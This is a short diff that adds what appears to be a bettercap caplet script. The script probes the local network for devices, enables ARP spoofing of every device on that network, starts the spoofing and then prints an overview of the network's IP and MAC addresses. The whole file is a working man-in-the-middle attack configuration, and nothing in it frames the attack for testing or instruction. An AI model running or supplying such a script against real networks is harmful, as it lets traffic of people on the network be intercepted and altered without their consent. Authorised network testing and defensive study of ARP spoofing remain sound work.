@@ -1,0 +1,10 @@
+# network scan to find devices
+net.probe on
+sleep 3
+net.probe off 
+
+set arp.spoof.internal true # spoof all devices in the local network
+
+arp.spoof on # start spoofing
+
+net.show # show an overview of the local network (ip/mac addresses)
